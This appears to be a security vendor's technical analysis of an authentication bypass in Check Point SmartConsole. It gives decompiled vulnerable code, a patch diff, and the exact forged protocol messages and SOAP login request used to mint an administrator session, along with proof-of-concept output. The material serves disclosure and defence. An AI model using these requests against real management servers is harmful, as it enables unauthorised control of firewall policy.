---
schema_version: "1.0.0"
document_id: "e63e988e00cf4b56717a2e7670bb499179af70bc07f5f64d35bda80edfbad620"
company_key: "rapid7-inc-common-stock"
company: "Rapid7 Inc."
source_id: "rapid7-inc-common-stock-rss-ea5a9037191f"
canonical_url: "https://www.rapid7.com/blog/post/ra-check-point-smartconsole-authentication-bypass-technical-analysis-cve-2026-16232"
published_at: "2026-07-28T18:32:03+00:00"
first_seen_at: "2026-07-28T20:02:40.937572+00:00"
fetched_at: "2026-07-28T20:31:35.420648+00:00"
content_hash: "sha256:e4f2907514a67810a833a0a0f12762e10ede54eb23c030a9817aeb92328b77f8"
---

# Rapid7 Analysis: Check Point SmartConsole Authentication Bypass (CVE-2026-16232)

## Overview


On July 22, 2026, Check Point published a


[security advisory](http://sk185169.md/) for


[CVE-2026-16232](https://www.rapid7.com/db/vulnerabilities/cve-2026-16232/) , an authentication bypass in the SmartConsole login process affecting Security Management Server and Multi-Domain Security Management Server (MDS).


**By leveraging CVE-2026-16232, an unauthenticated attacker can obtain an application login token, use this token to log in through SmartConsole with full administrator privileges, and modify the security policy or security configuration.**


Exploitation requires network access to the Management Server and for a Trusted Clients configuration that does not restrict GUI clients, which in our testing was a default setting. This vulnerability was reported as being


[exploited](https://www.rapid7.com/blog/post/etr-cve-2026-16232-critical-check-point-smartconsole-authentication-bypass-exploited-in-the-wild/) in the wild as a zero-day vulnerability at the time of disclosure.


Our analysis finds that the root cause of CVE-2026-16232 is a broken trust boundary in the application authentication path. A vulnerable server accepts an attacker-supplied Secure Internal Communication (SIC) distinguished name (DN) as the identity of a remote application instead of binding that identity to the authenticated remote peer certificate DN returned by


getCertificateDnName()


. An attacker can read the management server's own SIC DN during the unauthenticated bootstrap communication, replay that DN in a forged application certificate bind, obtain an application token, and then ask the legacy management service to mint a new SmartConsole single sign-on (SSO) ticket.


Rapid7 Labs has reproduced CVE-2026-16232 against affected R81.20 and R82.10 versions of the target software. Our


[proof-of-concept](https://github.com/sfewer-r7/CVE-2026-16232) (PoC) exploit script can be used to successfully validate if a target is either vulnerable or patched. The vendor supplied patches have been confirmed to successfully remediate the vulnerability and prevent our PoC script from succeeding.


## Analysis


SmartConsole is the desktop client administrators use to manage Check Point policy and configuration. A SmartConsole login crosses two generations of management plumbing over the network.


The first is the legacy FWM/CPMI service, listening on TCP


18190


. It uses SIC, Check Point's certificate-based trust mechanism for communication between management components. Once the SIC bootstrap completes, FWM exchanges length-prefixed “FwSet” objects, a Check Point name/value encoding used by older management services.


The second is the newer CPM/DLE service. This exposes SOAP services over HTTPS on TCP


19009


under the URI path


/cpmws/


. SmartConsole uses these services for login, queries, and object operations. Authenticated requests carry


DLESESSIONID


and


CLIENTSESSIONID


header values to prove a client is authenticated.


The exploit for CVE-2026-16232 uses both the FWM/CPMI and CPM/DLE services. It first uses the native FWM/CPMI protocol to claim an application identity and obtain an application token via the root cause of the vulnerability. It then uses the accepted native application session to ask FWM for a SmartConsole SSO ticket, redeems the ticket over CPM's SOAP API, and receives a SmartConsole session.


The diagram below shows the flow for exploiting CVE-2026-16232.


*Figure 1: Flow diagram of exploitation.*


### The application authentication boundary


The Java login service contains a bridge for FWM application based logins. The


authenticateUser


method splits the supplied username into an application name and a SIC DN, then passes both into


cpApplicationAuthentication()


.


```text
// Source: work/t146/mgmt_wrapper.tgz:fw1/cpm-server/dleserver.jar.full!/com/checkpoint/management/dleserver/coresvc/internal/LoginSvcImpl.class


private AuthenticationResponse authenticateUser(AuthenticationInfoBase authenticationInfoBase, String string, String string2, CPUUID cPUUID, boolean bl, LockAdminInfoContainer lockAdminInfoContainer, ExternalLoginInfo externalLoginInfo) throws AuthenticationFailureLoginException, LicenseExpiredLoginException {


// ...


} else if (authenticationInfoBase instanceof FwmAuthenticationInfo) {
object2 = authenticationInfoBase.getUsername();
int n = ((String)object2).toLowerCase().lastIndexOf("cn=");
object = (FwmAuthenticationInfo)authenticationInfoBase;
if (FwmLoginType.APPLICATION.equals((Object)object.getFwmLoginType())) {
String suppliedSicDn = ((String)object2).substring(n); // <-- [1]
String applicationName = ((String)object2).substring(0, n - 1); // <-- [2]
TdLog.debug((CPLogger)c, (String)"Authenticating FwmAuthenticationInfo on behalf of application {}", (Object[])new Object[]{applicationName});
CPApplicationAuthenticationInfo cPApplicationAuthenticationInfo = new CPApplicationAuthenticationInfo();
cPApplicationAuthenticationInfo.setUsername(applicationName);
this.cpApplicationAuthentication((AuthenticationInfoBase)cPApplicationAuthenticationInfo, suppliedSicDn, cPUUID);// <-- [3]
authenticationInfoBase.setUsername(applicationName);
```


At


\[1\]


and


\[2\]


, the login service treats attacker-controlled input as both the application name and the claimed SIC identity. At


\[3\]


, the untrusted DN claim reaches the remote application authenticator as a separate argument.


The method that consumes that identity is


authenticateRemoteApplication()


. This method prefers the attacker-supplied DN whenever one is present.


```text


private void authenticateRemoteApplication(String applicationName, String suppliedSicDn) throws AuthenticationFailureLoginException {
String effectiveSicDn = suppliedSicDn == null
? this.j.getCertificateDnName()
: suppliedSicDn; // <-- [1]
CpAssert.cpassert(StringUtils.isNotEmpty(effectiveSicDn), "User DN name is not set");
if (effectiveSicDn.equals("CN=siclocal")) {
this.authenticateLocal(applicationName);
} else {
this.t.identifyDomainForRemoteLogin(effectiveSicDn); // <-- [2]
}
}
```


The problem is at


\[1\]


. The vulnerable code collapses the untrusted claim and the authenticated peer identity into one variable. If


suppliedSicDn


is present, the code never uses


getCertificateDnName()


at all. The method then uses the attacker-controlled value at


\[2\]


to identify the login domain. In practice, a remote client can copy the management server's own SIC DN into


:DN


and authenticate as a remote application without presenting a client certificate for that identity.


### What the patch changes


Our analysis compares the decompiled


com.checkpoint.management.dleserver.coresvc.internal.LoginSvcImpl


class from a vulnerable “R81.20 Jumbo Hotfix Take 146” against the patched “R81.20 Jumbo Hotfix Take 158”.


```text
private void authenticateRemoteApplication(String applicationName, String suppliedSicDn)
throws AuthenticationFailureLoginException {
-    String effectiveSicDn = suppliedSicDn == null
-        ? this.j.getCertificateDnName()
-        : suppliedSicDn;                                      // <-- [1]
-    CpAssert.cpassert(StringUtils.isNotEmpty(effectiveSicDn), "User DN name is not set");
+    String effectiveSicDn;
+    String certificateDn = this.j.getCertificateDnName();
+    String remoteIp = this.j.getRemoteIpAddress();
+    boolean localSic = IpUtils.isLoopback(remoteIp) && "CN=siclocal".equals(certificateDn);
+    if (localSic && suppliedSicDn != null) {
+        effectiveSicDn = suppliedSicDn;                       // <-- [2]
+    } else {
+        effectiveSicDn = certificateDn;                       // <-- [3]
+        boolean mismatch = suppliedSicDn != null
+            && StringUtils.isNotEmpty(certificateDn)
+            && !suppliedSicDn.equalsIgnoreCase(certificateDn);
+        if (mismatch) {
+            TdLog.error(c,
+                "Rejecting caller-supplied SIC name that does not match the client certificate DN for application {} from {}",
+                applicationName, remoteIp);
+            throw new AuthenticationFailureLoginException(
+                "Remote authentication failed for peer " + remoteIp + "."); // <-- [4]
+        }
+    }
+    if (Strings.isNullOrEmpty(effectiveSicDn)) {
+        TdLog.error(c, "Remote application {} login rejected: no authenticated SIC identity",
+            applicationName);
+        throw new AuthenticationFailureLoginException(
+            "Remote authentication failed for peer " + remoteIp + ".");     // <-- [5]
+    }
if (effectiveSicDn.equals("CN=siclocal")) {
this.authenticateLocal(applicationName);
} else {
this.t.identifyDomainForRemoteLogin(effectiveSicDn);
}
}
```


Shown above, the vulnerable “Take 146” accepts the caller's DN at


\[1\]


. The patched “Take 158” only allows a supplied DN for loopback


CN=siclocal


traffic at


\[2\]


, which preserves the local application case. Remote clients now use the authenticated remote peer certificate DN at


\[3\]


, and any mismatch between the supplied DN and that authenticated identity is rejected at


\[4\]


. The new empty identity check at


\[5\]


also prevents a remote application login when there is no authenticated SIC identity at all.


This is why replaying the management server's DN no longer works. The attacker can still send the same


:DN


text, but the patched remote path does not use that text as


effectiveSicDn


. If the client presents no certificate, as in our PoC,


certificateDn


is empty and the check at


\[5\]


rejects the login. If the client presents a certificate with some other DN, the mismatch check at


\[4\]


rejects the forged server DN. To make the supplied server DN survive the patched checks, the attacker would need an authenticated client certificate whose subject DN already matches that server DN, which removes the unauthenticated bypass.


### Protocol flow to a SmartConsole session


The relevant application-layer traffic is shown below in the order our PoC sends it. For brevity, we have omitted the boilerplate CA and CRL bootstrap exchange as it is not pertinent to the vulnerability’s root cause.


After the SIC bootstrap, the PoC sends a certificate bind request that supplies the management server's own SIC DN (


cp_mgmt,o=gw-5622ca..5otbwa


in the example below):


```text
(
:local_bind (0)
:token_bind (0)
:DN ("cn=cp_mgmt,o=gw-5622ca..5otbwa") # <-- attacker-controlled identity
:certificate_bind (1)
:application_login ("CPM Server")
:client_without_administrator (true)
)
```


Despite the


:certificate_bind


field name, the PoC does not load or present a client certificate in its Python TLS context. The bind request only provides the


:DN


claim as a text string. On a vulnerable server, the bind succeeds because the application login path accepts


:DN


as the effective SIC identity. The PoC then sends an


open-database


request, shown below, and receives the application login token described in Check Point's advisory.


```text
(
:type (command)
:subject (open-database)
:body (
:Name ()
:db_open_reason ()
:dle_session_id ()
:database ()
:db_open_id ("(nil)")
)
:no-reply (false)
)
```


The


open-database


response is a binary-encoded FwSet object. The PoC extracts the 43-character DLE token from that response and then uses it as a CPM


DLESESSIONID


value.


The next step is to perform a


gen-sso-token


request. The forged application session asks FWM to create a SmartConsole ticket whose original client claims


system_admin


, local SOAP binding, and a permission bitmap indicating full permissions (i.e. all permission bits are set):


```text
(
:type (command)
:subject (gen-sso-token)
:body (
:type (SmartConsole)
:sso_original_client (SmartConsole
:lower_name (system_admin)
:soap_local_bind (1)
:permissions ("ffffffff|ffffffff|ffffffff")
)
)
)
```


The native FWM authorization code has a special case for this command. If the current client is treated as a Check Point config administrator (which it will be), a


gen-sso-token


request is allowed before the normal permission mask check, as shown in


\[1\]


below.


```text
// Source: work/native_patch/t146/fw1/fw1/bin/fwm.full (fwm_is_authorized)


_BOOL4 __cdecl fwm_is_authorized(int a1, int a2, int a3)
{
int v3; // eax
int v4; // eax
int v5; // eax
bool v6; // zf
int v7; // edx
int v9; // [esp+14h] [ebp-34h]
int v10; // [esp+18h] [ebp-30h]
const char *v11; // [esp+1Ch] [ebp-2Ch]
_DWORD v12[7]; // [esp+2Ch] [ebp-1Ch] BYREF


v11 = *(const char **)a2;
v10 = CPMIGetClientPermission(a1);
v12[0] = 0;
v9 = CPMIGetClientAdvancedPermission(a1);
fwobj_getint(a1, g_szCPMI_SOAP_LOCAL_BIND, v12);
if ( v12[0] != 1 )
{
if ( is_fwmalert_client(a1) && strcmp(v11, "fwm-alert") )
return 0;
v3 = fwobj_safe_get(a1, g_szCPMI_LOWER_NAME);
if ( strcmp(v11, "gen-sso-token") || !fwm_isCpconfigAdmin(v3) ) // <-- [1]
{
// Normal command permission checks follow.
// ...
return 0;
}
}
return 1;
}
```


The


gen-sso-token


response contains a new SSO ticket. The attacker then redeems that ticket through the normal SmartConsole SOAP login path. The request below shows only the fields that matter to this analysis:


```text
POST /cpmws/LoginSvcRemote HTTP/1.1
Host: 192.168.86.15:19009
Content-Type: text/xml; charset=utf-8
SOAPAction: ""


<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:l="http://www.checkpoint.com/DleWebService/LoginSvcRemote"
xmlns:d="http://www.checkpoint.com/management/objects/schema/DleServerCoreSvc"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<soap:Body>
<l:loginNew>
<d:loginRequest>
<d:applicationName>SmartConsole</d:applicationName>
<d:domain>a0eebc99-afed-4ef8-bb6d-fedfedfedfed</d:domain>
<d:authenticationInfo xsi:type="d:UserSSOTokenAuthenticationInfo">
<d:username>system_admin</d:username>
<d:SSOToken>512d49aa4c026d57177bea06dd28669c889479bfa8ea6d3b53fabe59ec9e0a2e</d:SSOToken>
</d:authenticationInfo>
</d:loginRequest>
</l:loginNew>
</soap:Body>
</soap:Envelope>
```


The


loginNew


response returns the two identifiers that SmartConsole uses for later requests:


```text
<loginNewResponse>
<return>
<clientSessionId>ZMKhaQEsZ7bkMSlMVR7ARhvQIeTCdqwlvrcN-Ux4CvI</clientSessionId>
<sid>hRA3CPLRpTalxBIiv3miYGFlLy6JNHYQwqcKhD4Aktg</sid>
</return>
</loginNewResponse>
```


At this point, the attacker has moved from unauthenticated network access to a SmartConsole session identified by


sid


and


clientSessionId


. Ticket redemption is also the step that produces the advisory's log based IOC, with a message “Authentication method: application token” logged in the audit log, as shown in Figure 2 below.


*Figure 2: Audit Log IOC.*


## Exploitation


Our


[PoC](https://github.com/sfewer-r7/CVE-2026-16232) implements the minimum SIC/CPMI bootstrap needed to obtain the application token, mint the SmartConsole ticket, redeem it over SOAP, and display the results of several privileged operations before and after ticket redemption .


The following shows our PoC running against a vulnerable R81.20 target.


```text
$ python3 CVE-2026-16232.py --target 192.168.86.15
[+] Targeting: 192.168.86.15
[+] SIC/CPMI connected
[+] Forged application DN: cn=cp_mgmt,o=gw-5622ca..5otbwa
[+] Application bind succeeded
[+] Application token obtained: XYB8PbLoXXnMx4J7W45UK-BhrjWkolvihp0P98G2qDc
[+] getServerInfo
hostName: gw-5622ca
hostIpAddress: 192.168.86.15
osName: Linux
osVersion: 3.10.0-1160.15.2cpx86_64
[+] Application token GetAllAdmins count: 0
[+] SmartConsole application-token ticket redeemed: 34bd621cc8855634fd97484fec258a18eb14eb8feb14b22c260a4accba715808
[+] GetAllAdmins count: 6
admin: UNIX_PASSWORD
Remote CPM Server_cn=cp_mgmt,o=gw-5622ca..5otbwa: INTERNAL_PASSWORD
upgrade_cn=cp_mgmt,o=gw-5622ca..5otbwa: INTERNAL_PASSWORD
admin_cn=cp_mgmt,o=gw-5622ca..5otbwa: INTERNAL_PASSWORD
SmartView Reporter Client_cn=cp_mgmt,o=gw-5622ca..5otbwa: INTERNAL_PASSWORD
CPM Server_cn=cp_mgmt,o=gw-5622ca..5otbwa: INTERNAL_PASSWORD
```


For the purpose of demonstrating the vulnerability and the level of access the authentication bypass achieves, the PoC uses the authentication bypass to access some protected resources. Specifically, the PoC retrieves some basic system information via a call to


getServerInfo


, and retrieves the SmartConsole admin accounts via a call to


GetAllAdmins


.


First, the PoC uses the application token as a


DLESESSIONID


value for


PerformanceTestSvcRemote.getServerInfo


. The same SOAP method returns a fault without a valid session, while the application token returns the server information


The PoC then sends the same


GetAllAdmins


query twice, once with the application token and once with the redeemed SmartConsole session.


Using only the application token receives a successful query response with zero visible records, while using the redeemed SmartConsole session receives all records available.


Running the same PoC against a patched R82.10 target shows the malicious application bind request failing.


```text
$ python3 CVE-2026-16232.py --target 192.168.86.16
[+] Targeting: 192.168.86.16
[+] SIC/CPMI connected
[+] Forged application DN: cn=cp_mgmt,o=gw-5622cc..tmbpin
[-] Application bind failed. The target is likely patched and not vulnerable.
```


## Remediation


For remediation guidance, please see Rapid7’s Emergent Threat Response


[blog](https://www.rapid7.com/blog/post/etr-cve-2026-16232-critical-check-point-smartconsole-authentication-bypass-exploited-in-the-wild/) for CVE-2026-16232 which contains further details.
